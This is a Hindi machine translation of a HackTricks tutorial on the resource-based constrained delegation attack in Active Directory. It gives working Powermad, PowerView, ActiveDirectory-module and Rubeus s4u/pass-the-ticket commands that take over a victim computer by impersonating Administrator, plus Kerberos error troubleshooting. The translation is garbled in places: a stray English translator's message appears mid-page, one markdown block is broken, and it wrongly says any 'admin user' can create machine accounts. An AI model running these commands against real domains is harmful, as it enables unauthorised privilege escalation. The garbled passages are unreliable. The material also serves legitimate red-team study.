# संसाधन-आधारित संयमित प्रतिनिधित्व

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग तरकीबें साझा करें.

</details>

## संसाधन-आधारित संयमित प्रतिनिधित्व की मूल बातें

यह [संयमित प्रतिनिधित्व](constrained-delegation.md) के समान है लेकिन **इसके बजाय** किसी **ऑब्जेक्ट** को किसी सेवा के खिलाफ **किसी भी उपयोगकर्ता का प्रतिरूपण करने की अनुमति देने के बजाय**. संसाधन-आधारित संयमित प्रतिनिधित्व **उस ऑब्जेक्ट में सेट करता है जो इसके खिलाफ किसी भी उपयोगकर्ता का प्रतिरूपण कर सकता है**.

इस मामले में, संयमित ऑब्जेक्ट में _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक विशेषता होगी जिसमें उस उपयोगकर्ता का नाम होगा जो इसके खिलाफ किसी अन्य उपयोगकर्ता का प्रतिरूपण कर सकता है.

इस संयमित प्रतिनिधित्व और अन्य प्रतिनिधित्वों में एक और महत्वपूर्ण अंतर यह है कि किसी भी उपयोगकर्ता के पास जो **मशीन खाते पर लिखने की अनुमतियां** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/आदि_) है, वह _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ सेट कर सकता है (अन्य प्रतिनिधित्व रूपों में आपको डोमेन एडमिन विशेषाधिकारों की आवश्यकता थी).

### नई अवधारणाएँ

संयमित प्रतिनिधित्व में यह बताया गया था कि **`TrustedToAuthForDelegation`** ध्वज उपयोगकर्ता के _userAccountControl_ मान में आवश्यक है ताकि **S4U2Self** का प्रदर्शन किया जा सके. लेकिन यह पूरी तरह से सच नहीं है.\
वास्तविकता यह है कि उस मान के बिना भी, आप किसी भी उपयोगकर्ता के खिलाफ **S4U2Self** का प्रदर्शन कर सकते हैं यदि आप एक **सेवा** हैं (एक SPN है) लेकिन, यदि आपके पास **`TrustedToAuthForDelegation`** है तो वापसी TGS **Forwardable** होगा और यदि आपके पास वह ध्वज **नहीं है** तो वापसी TGS **Forwardable नहीं** होगा.

हालांकि, यदि **TGS** जो **S4U2Proxy** में इस्तेमाल किया जाता है **Forwardable नहीं है**, तो **बेसिक संयमित प्रतिनिधित्व** का दुरुपयोग करने की कोशिश **काम नहीं करेगी**. लेकिन यदि आप **संसाधन-आधारित संयमित प्रतिनिधित्व का शोषण कर रहे हैं, तो यह काम करेगा** (यह एक भेद्यता नहीं है, यह एक विशेषता है, जाहिरा तौर पर).

### हमले की संरचना

> यदि आपके पास **कंप्यूटर** खाते पर **लिखने के समकक्ष विशेषाधिकार** हैं तो आप उस मशीन में **विशेषाधिकार प्राप्त पहुंच** प्राप्त कर सकते हैं।

मान लीजिए कि हमलावर के पास पहले से ही **पीड़ित कंप्यूटर पर लिखने के समकक्ष विशेषाधिकार हैं**।

1. हमलावर **एक खाते को समझौता करता है** जिसमें एक **SPN** है या **एक बनाता है** (“सेवा A”). ध्यान दें कि **कोई भी** _एडमिन उपयोगकर्ता_ बिना किसी अन्य विशेष विशेषाधिकार के 10 **कंप्यूटर ऑब्जेक्ट्स (**_**MachineAccountQuota**_**) तक **बना सकता है** और उन्हें एक **SPN** सेट कर सकता है। इसलिए हमलावर बस एक कंप्यूटर ऑब्जेक्ट बना सकता है और एक SPN सेट कर सकता है।
2. हमलावर **पीड़ित कंप्यूटर (सेवा B) पर अपने WRITE विशेषाधिकार का दुरुपयोग करता है** ताकि **संसाधन-आधारित संयमित प्रतिनिधित्व को कॉन्फ़िगर कर सके जो सेवा A को पीड़ित कंप्यूटर (सेवा B) के खिलाफ किसी भी उपयोगकर्ता का प्रतिरूपण करने की अनुमति देता है**।
3. हमलावर Rubeus का उपयोग करके सेवा B के लिए एक उपयोगकर्ता **के साथ विशेषाधिकार प्राप्त पहुंच के साथ** सेवा A से सेवा B के लिए **पूर्ण S4U हमला** (S4U2Self और S4U2Proxy) करता है।
   1. S4U2Self (समझौता किए गए/बनाए गए खाते से): **मेरे लिए एक व्यवस्थापक का TGS मांगें** (Forwardable नहीं)।
   2. S4U2Proxy: पहले के चरण में **Forwardable नहीं TGS** का उपयोग करके **पीड़ित मेजबान** के लिए **व्यवस्थापक से TGS मांगें**।
   3. यहां तक कि यदि आप Forwardable नहीं TGS का उपयोग कर रहे हैं, जैसा कि आप संसाधन-आधारित संयमित प्रतिनिधित्व का शोषण कर रहे हैं, यह काम करेगा।
4. हमलावर **टिकट पास कर सकता है** और **पीड़ित सेवा B तक पहुंच प्राप्त करने के लिए उपयोगकर्ता का प्रतिरूपण कर सकता है**।

डोमेन के _**MachineAccountQuota**_ की जांच करने के लिए आप उपयोग कर सकते हैं:
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप [powermad](https://github.com/Kevin-Robertson/Powermad) का उपयोग करके डोमेन के अंदर एक कंप्यूटर ऑब्जेक्ट बना सकते हैं**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Since there is no text provided outside of the image reference, there is nothing to translate. If you have specific text you would like translated, please provide it.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### रिसोर्स-आधारित कंस्ट्रेन्ड डेलिगेशन को कॉन्फ़िगर करना

**activedirectory PowerShell मॉड्यूल का उपयोग करते हुए**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
```markdown
![](../../.gitbook/assets/B2.png)

**पावरव्यू का उपयोग करना**
```
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### पूर्ण S4U हमला करना

सबसे पहले, हमने नया Computer object पासवर्ड `123456` के साथ बनाया, इसलिए हमें उस पासवर्ड के हैश की आवश्यकता है:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES हैशेज़ प्रिंट करेगा।
अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके एक बार में अधिक टिकट उत्पन्न कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ध्यान दें कि उपयोगकर्ताओं में "**Cannot be delegated**" नामक एक विशेषता होती है। यदि किसी उपयोगकर्ता के पास यह विशेषता सत्य के रूप में है, तो आप उसकी नकल नहीं कर पाएंगे। इस संपत्ति को bloodhound के अंदर देखा जा सकता है।
{% endhint %}

![](../../.gitbook/assets/B3.png)

### पहुँच

अंतिम कमांड लाइन **पूर्ण S4U हमले को प्रदर्शित करेगी और TGS को Administrator से पीड़ित होस्ट में **मेमोरी** में इंजेक्ट करेगी।\
इस उदाहरण में Administrator से **CIFS** सेवा के लिए एक TGS की मांग की गई थी, इसलिए आप **C$** तक पहुँच सकेंगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकटों का दुरुपयोग

[**उपलब्ध सेवा टिकटों के बारे में यहाँ जानें**](silver-ticket.md#available-services)।

## Kerberos त्रुटियाँ

* **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि kerberos DES या RC4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश प्रदान करें (या केवल rc4, aes128 और aes256 हैश प्रदान करें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और kerberos ठीक से काम नहीं कर रहा है।
* **`preauth_failed`**: इसका मतलब है कि दिया गया उपयोगकर्ता नाम + हैशेज़ लॉगिन करने के लिए काम नहीं कर रहे हैं। आपने हैशेज़ जेनरेट करते समय उपयोगकर्ता नाम में "$" डालना भूल गए हो सकते हैं (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
  * आप जिस उपयोगकर्ता को इम्पर्सनेट करने की कोशिश कर रहे हैं वह वांछित सेवा तक पहुँच नहीं सकता (क्योंकि आप उसे इम्पर्सनेट नहीं कर सकते या क्योंकि उसके पास पर्याप्त अधिकार नहीं हैं)
  * पूछी गई सेवा मौजूद नहीं है (यदि आप winrm के लिए एक टिकट मांगते हैं लेकिन winrm चल नहीं रहा है)
  * बनाया गया fakecomputer अपने अधिकार खो चुका है और आपको उसे वापस देने की जरूरत है।

## संदर्भ

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें**।
* **HackTricks** को अपनी हैकिंग ट्रिक्स साझा करके PRs सबमिट करें [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
